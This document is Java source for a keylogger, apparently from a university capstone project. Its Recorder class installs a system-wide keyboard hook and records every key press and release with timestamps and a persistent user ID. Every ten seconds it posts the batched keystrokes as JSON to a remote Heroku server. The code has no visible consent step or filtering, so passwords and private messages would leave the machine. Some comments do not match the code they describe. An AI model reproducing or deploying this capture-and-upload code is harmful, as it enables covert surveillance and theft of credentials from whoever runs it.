package com.uwo.keylogger;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import javax.net.ssl.HttpsURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.prefs.Preferences;

import javax.swing.JOptionPane;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.dispatcher.SwingDispatchService;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.google.gson.*;
/**
 * Hello world!
 *
 */
public class Recorder implements NativeKeyListener {

	ArrayList<Keystroke> events;
	Timer timer;
	String identifier;

	class Keystroke {
		char direction;
		int keyCode;
		long time;
		int modifiers;
		String user;

		public Keystroke(char direction, int keyCode, long time, int modifiers, String user) {
			this.direction = direction;
			this.keyCode = keyCode;
			this.time = time;
			this.modifiers = modifiers;
			this.user = user;
		}

		public String getCSVRow() {
			return direction + "," + keyCode + "," + NativeKeyEvent.getKeyText(keyCode) + "," + time + "," + modifiers + "\n";
		}

	}

	class Sync extends TimerTask {
		@Override
		public void run() {
			if (events.size() == 0) return;
			ArrayList<Keystroke> eventsToSync = events;
			events = new ArrayList<Keystroke>();
			Gson gson = new Gson();
			try {

				String url = "https://capstone-keylogger.herokuapp.com/strokes";
				URL obj = new URL(url);
				HttpURLConnection con = (HttpURLConnection) obj.openConnection();

				// Setting basic post request
				con.setRequestMethod("POST");
				con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
				con.setRequestProperty("Content-Type","application/json");

				String postJsonData = gson.toJson(eventsToSync);

				// Send post request
				con.setDoOutput(true);
				DataOutputStream wr = new DataOutputStream(con.getOutputStream());
				wr.writeBytes(postJsonData);
				wr.flush();
				wr.close();

				int responseCode = con.getResponseCode();
				System.out.println("nSending 'POST' request to URL : " + url);
				System.out.println("Post Data : " + postJsonData);
				System.out.println("Response Code : " + responseCode);

				BufferedReader in = new BufferedReader(
						new InputStreamReader(con.getInputStream()));
				String output;
				StringBuffer response = new StringBuffer();

				while ((output = in.readLine()) != null) {
					response.append(output);
				}
				in.close();

				//printing result from response
				System.out.println(response.toString());
			} 
			catch (Exception e) {
				events.addAll(eventsToSync);
				System.out.println("Cached for later: " + events.size());
				e.printStackTrace();
			}
		}

	}

	public Recorder() {
		identifier = getPersonId();
		if (identifier == null) {
			UUID random = UUID.randomUUID();
			setPersonId(random.toString());
		}
		System.out.println(identifier);

		// Get the logger for "org.jnativehook" and set the level to warning.
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		GlobalScreen.setEventDispatcher(new SwingDispatchService());

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);

		events = new ArrayList<Keystroke>();

	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		events.add(new Keystroke('d', e.getKeyCode(), System.currentTimeMillis(), e.getModifiers(), identifier));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		events.add(new Keystroke('u', e.getKeyCode(), System.currentTimeMillis(), e.getModifiers(), identifier));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {}

	public boolean start() {
		try {
			GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(this);
			timer = new Timer();
			timer.schedule(new Sync(), 10000, 10000);
			return true;
		}
		catch (NativeHookException ex) {
			stop();
			JOptionPane.showMessageDialog(null, "There was a problem registering the native hook.", "Alert", JOptionPane.WARNING_MESSAGE);
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());
		}
		catch (Exception ex) {
			System.err.println(ex.getMessage());
		}
		return false;

	}

	public boolean stop() {
		try {
			GlobalScreen.removeNativeKeyListener(this);
			GlobalScreen.unregisterNativeHook();
			if (timer != null) timer.cancel();
			return true;
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		return false;
	}

	/**
	 * Returns the person file preference, i.e. the file that was last opened.
	 * The preference is read from the OS specific registry. If no such
	 * preference can be found, null is returned.
	 * 
	 * @return
	 */
	public String getPersonId() {
		Preferences prefs = Preferences.userNodeForPackage(Recorder.class);
		return prefs.get("id", null);
	}

	/**
	 * Sets the file path of the currently loaded file.
	 * The path is persisted in the OS specific registry.
	 * 
	 * @param file the file or null to remove the path
	 */
	public void setPersonId(String id) {
		Preferences prefs = Preferences.userNodeForPackage(Recorder.class);
		if (id != null) {
			identifier = id;
			prefs.put("id", id);
		} else {
			prefs.remove("id");
		}
	}
}
